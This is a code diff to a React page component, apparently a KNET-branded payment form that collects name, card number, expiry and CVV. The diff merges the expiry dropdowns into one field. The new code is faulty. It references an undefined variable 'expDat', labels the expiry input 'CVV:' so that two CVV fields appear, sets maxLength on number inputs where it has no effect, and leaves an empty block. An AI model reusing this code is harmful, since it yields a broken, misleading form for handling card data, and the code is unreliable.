@@ -11,8 +11,7 @@ import styles from './page.module.css';
 export default function KnetPage() {
   const [fullName, setFullName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
-  const [expMonth, setExpMonth] = useState("");
-  const [expYear, setExpYear] = useState("");
+  const [expData, setExpData] = useState("");
   const [cvv, setCvv] = useState("");
   const router = useRouter();
 
@@ -20,8 +19,8 @@ export default function KnetPage() {
     if (
       fullName.trim() === "" ||
       cardNumber.trim() === "" ||
-      expMonth.trim() === "" ||
-      expYear.trim() === "" ||
+      expData.trim() === "" ||
+
       cvv.trim() === ""
     ) {
       alert("من فضلك املئ الحقول");
@@ -108,49 +107,35 @@ export default function KnetPage() {
           <div>
             <label className={styles.formLabel}>Expiration Date:</label>
             <div className={styles.expRow}>
-              <select
-                className={styles.formInput}
-                value={expMonth}
-                onChange={(e) => setExpMonth(e.target.value)}
-                required
-              >
-                <option value="">MM</option>
-                {[...Array(12)].map((_, i) => {
-                  const m = String(i + 1).padStart(2, "0");
-                  return (
-                    <option key={m} value={m}>
-                      {m}
-                    </option>
-                  );
-                })}
-              </select>
-              <select
-                className={styles.formInput}
-                value={expYear}
-                onChange={(e) => setExpYear(e.target.value)}
-                required
-              >
-                <option value="">YYYY</option>
-                {[2025, 2026, 2027, 2028].map((year) => (
-                  <option key={year} value={year}>
-                    {year}
-                  </option>
-                ))}
-              </select>
-            </div>
-          </div>
-          <hr />
-
-          <div>
-            <label className={styles.formLabel}>CVV:</label>
+                <div>
+                                <label className={styles.formLabel}>CVV:</label>
             <input
-              type="password"
+              type="number"
+              maxLength="6"
+              value={expDat}
+              onChange={(e) => setExpData(e.target.value)}
+              required
+              className={styles.formInput}
+            />
+                </div>
+                              <div>
+                                <label className={styles.formLabel}>CVV:</label>
+            <input
+              type="number"
               maxLength="4"
               value={cvv}
               onChange={(e) => setCvv(e.target.value)}
               required
               className={styles.formInput}
             />
+                </div>
+          
+            </div>
+          </div>
+          <hr />
+
+          <div>
+
           </div>
           <hr />
 
